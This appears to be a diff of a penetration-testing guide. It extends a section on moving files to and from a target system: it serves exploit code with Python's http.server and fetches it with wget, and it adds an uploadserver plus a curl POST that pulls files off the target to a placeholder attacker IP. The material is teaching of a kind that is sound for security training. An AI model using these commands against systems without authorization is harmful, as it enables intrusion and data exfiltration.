@@ -769,71 +769,100 @@ By using these options, you can gather comprehensive details about the network s
   wget http://example.com/file.txt
   ```
 
-#### Transferring Files with SimpleHTTPServer and `wget`
+#### Transferring Files with SimpleHTTPServer, UploadServer, `wget`, and `curl`
 
-You can transfer files, including exploit code, from your machine to the target system using the SimpleHTTPServer Python module and `wget` respectively.
+You can transfer files between your machine and a target system using the SimpleHTTPServer Python module with `wget` for downloads, and `uploadserver` with `curl` for uploads.
+
+---
 
 **Using SimpleHTTPServer to Host Files**:
 
-- **SimpleHTTPServer**:
+- **SimpleHTTPServer**:  
   SimpleHTTPServer is a Python module that allows you to quickly set up a web server to serve files from a directory. This is useful for transferring files to another machine on the same network.
 
   **Starting SimpleHTTPServer**:
 
   For Python 3.x:
-
   ```bash
   cd /path/to/your/files
   python3 -m http.server 8000
   ```
 
   For Python 2.x:
-
   ```bash
   cd /path/to/your/files
   python -m SimpleHTTPServer 8000
   ```
 
-  This command starts a simple HTTP server on port 8000, serving files from the specified directory. You can then access these files from any machine on the network by navigating to `http://your_ip_address:8000` in a web browser or using `wget`.
+  This command starts a simple HTTP server on port 8000, serving files from the specified directory. You can then access these files from any machine on the network by navigating to `http://<your_ip_address>:8000` in a web browser or using `wget`.
+
+---
 
 **Using `wget` to Download Files**:
 
-- **`wget`**:
+- **`wget`**:  
   After starting the SimpleHTTPServer on your machine, you can use `wget` on the target system to download the files.
 
   **Downloading Files with `wget`**:
-
   ```bash
-  wget http://your_ip_address:8000/filename
+  wget http://<your_ip_address>:8000/filename
+  ```
+  Replace `<your_ip_address>` with the IP address of the machine running the SimpleHTTPServer, and `filename` with the name of the file you want to download.
+
+---
+
+**Using UploadServer to Accept File Uploads**:
+
+- **UploadServer**:  
+  In addition to hosting files for download, you can set up an upload server to accept incoming files from other machines.
+
+  **Starting the Upload Server**:
+  ```bash
+  sudo python3 -m uploadserver
   ```
 
-  Replace `your_ip_address` with the IP address of the machine running the SimpleHTTPServer, and `filename` with the name of the file you want to download.
+  This command starts an upload server on the default port (typically 8000) that listens for incoming file uploads.
+
+  **Uploading Files with `curl`**:
+  ```bash
+  curl -X POST http://<your_ip_address>:8000/upload -F 'files=@/path/to/your/file'
+  ```
+  Replace `<your_ip_address>` with the IP address of the machine running the upload server and `/path/to/your/file` with the path to the file you want to upload.
+
+---
 
 **Example Workflow**:
 
 1. **Start SimpleHTTPServer on Your Machine**:
 
     For Python 3.x:
-
     ```bash
     cd /path/to/exploit/code
     python3 -m http.server 8000
     ```
 
     For Python 2.x:
-
     ```bash
     cd /path/to/exploit/code
     python -m SimpleHTTPServer 8000
     ```
 
 2. **Download the File on the Target System Using `wget`**:
-
     ```bash
-    wget http://your_ip_address:8000/exploit.py
+    wget http://<your_ip_address>:8000/exploit.py
     ```
 
-By using SimpleHTTPServer and `wget`, you can easily transfer files between machines on the same network, facilitating tasks such as deploying exploit code or sharing data.
+3. **(Optional) Start the Upload Server to Accept Files**:
+    ```bash
+    sudo python3 -m uploadserver
+    ```
+
+4. **Upload a File from Another System Using `curl`**:
+    ```bash
+    curl -X POST http://<your_ip_address>:8000/upload -F 'files=@/path/to/your/file'
+    ```
+
+By using SimpleHTTPServer with `wget` for downloads and `uploadserver` with `curl` for uploads, you can easily transfer files between machines on the same network, facilitating tasks such as deploying exploit code, sharing data, or receiving files from remote systems.
 
 #### `curl`
 
